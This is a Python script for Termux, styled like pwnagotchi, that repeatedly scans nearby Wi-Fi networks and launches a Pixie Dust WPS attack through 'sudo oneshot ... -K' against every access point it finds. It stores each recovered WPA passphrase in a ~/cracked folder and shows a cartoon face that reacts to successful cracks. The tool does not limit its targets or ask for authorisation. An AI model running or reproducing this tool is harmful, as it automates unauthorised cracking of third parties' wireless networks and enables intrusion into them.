#!/usr/bin/env python3
"""
pwnagotchi-like Termux app with custom scanning and per-BSSID attacks
Uses `iw dev <interface> scan` and `oneshot -b` non-interactively.
All code in one file. Python 3.9+
Features:
  - Background Wi-Fi scanning via `iw`
  - Per-BSSID Pixie Dust attacks: `sudo oneshot -i wlan0 -b <BSSID> -K`
  - Dynamic curses UI with ASCII pet face + counters
  - Re-scans every 5s when idle
  - Saves each cracked PSK in ~/cracked
Note: Ensure Wi‑Fi scanning is allowed (hotspot off, location enabled if needed).
"""
import os
import sys
import subprocess
import time
import re
import curses
from datetime import datetime

# Configuration
INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5  # seconds between full cycles
ATTACK_TIMEOUT = 10  # seconds per BSSID attack
ONESHOT_CMD = 'oneshot'

os.makedirs(CRACKED_DIR, exist_ok=True)

# ASCII faces
def face_lines(state):
    return {
        'neutral': ["  -   -  ", " ( o   o )", "   \___/  "],
        'happy':   ["  ^   ^  ", " ( o ^ o )", "   \___/  "],
        'sad':     ["  -   -  ", " ( o . o )", "   \___/  "]
    }.get(state, ["  -   -  ", " ( o   o )", "   \___/  "])

# Scan for BSSIDs using iw
def scan_networks(interface):
    try:
        proc = subprocess.run(
            ['iw', 'dev', interface, 'scan'], capture_output=True, text=True, check=True
        )
        output = proc.stdout
    except subprocess.CalledProcessError as e:
        return []

    bssids = []
    for line in output.splitlines():
        line = line.strip()
        if line.startswith('BSS '):
            # line: BSS aa:bb:cc:dd:ee:ff(freq...)
            parts = line.split()
            if len(parts) >= 2:
                bssid = parts[1]
                bssids.append(bssid)
    return list(dict.fromkeys(bssids))  # unique

# Run oneshot attack on a BSSID
def attack_bssid(bssid):
    cmd = ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K']
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=ATTACK_TIMEOUT)
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return ''
    except Exception:
        return ''

# Parse PSKs from output
def parse_psks(output):
    return re.findall(r'PSK:\s*(\S+)', output)

# Save cracked PSK
def save_crack(bssid, psk):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{ts}_{bssid.replace(':','')}.txt"
    path = os.path.join(CRACKED_DIR, filename)
    with open(path, 'w') as f:
        f.write(f"BSSID: {bssid}\nPSK: {psk}\n")

# Main curses UI
def ui_loop(stdscr):
    curses.curs_set(False)
    stdscr.nodelay(False)
    state = 'neutral'
    total_scanned = 0
    total_cracked = 0

    while True:
        # Perform scan
        bssids = scan_networks(INTERFACE)
        count_scan = len(bssids)
        total_scanned += count_scan

        # Attack each network
        cracked_this_cycle = 0
        for bssid in bssids:
            output = attack_bssid(bssid)
            psks = parse_psks(output)
            if psks:
                cracked_this_cycle += len(psks)
                for psk in psks:
                    save_crack(bssid, psk)

        total_cracked += cracked_this_cycle
        state = 'happy' if cracked_this_cycle else 'sad'

        # Draw UI
        stdscr.clear()
        for idx, line in enumerate(face_lines(state)):
            stdscr.addstr(idx, 0, line)
        stdscr.addstr(5, 0, f"Total scanned: {total_scanned}")
        stdscr.addstr(6, 0, f"Total cracked: {total_cracked}")
        stdscr.addstr(8, 0, f"Last cycle: scanned {count_scan}, cracked {cracked_this_cycle}")
        stdscr.addstr(10, 0, "Press Ctrl+C to quit")
        stdscr.refresh()

        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)
    try:
        curses.wrapper(ui_loop)
    except KeyboardInterrupt:
        pass
